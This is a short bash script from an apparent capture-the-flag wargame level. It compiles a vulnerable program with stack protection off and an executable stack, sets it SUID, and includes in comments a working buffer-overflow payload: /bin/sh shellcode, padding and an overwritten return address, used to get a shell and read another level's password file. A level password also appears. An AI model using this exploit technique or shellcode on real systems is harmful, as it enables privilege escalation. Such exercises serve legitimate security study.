#!/bin/bash
# This script will allow to test the pseudo code in source.c file by copy it in the folder /tmp in the VM

# -------------------------------- PREREQUIRES -------------------------------- #
#                            From your local machine                            #
#       Copy the source and the script files in the tmp folder in your VM       #
#                  scp -P 4242 path/source.c level3@VM_IP:/tmp                  #
#                  scp -P 4242 path/script.sh level3@VM_IP:/tmp                 #
#                                                                               #
#     pwd: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02     #
#                                                                               #
#                                                                               #
#                                                                               #
#                   Don't forget to run it ;) bash script.sh                    #
# ----------------------------------------------------------------------------- #

# Compile the program
gcc -fno-stack-protector source.c -z execstack -o ft_level2
# -fno-stack-protector : https://stackoverflow.com/questions/1345670/stack-smashing-detected
# -z execstack : https://security.stackexchange.com/questions/186506/how-does-gcc-compiler-guard-stack-for-stack-overflow

# Set SUID to give root user permissions
chmod u+s ft_level2

# Add write and execution permissions on home directory
chmod +wx ~

# Move the program to home directory
mv ft_level2 ~


# Then you have to run the program and cat .pass as level2 by taping manually these commands

#	su level2
#	// the new return address of malloc() function is 0x0804b008
#	python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A" * 59 + "\x08\xb0\x04\x08"' > /tmp/exploit
#	cat /tmp/exploit - | /home/user/level3/ft_level2
#	cat /home/user/level3/.pass
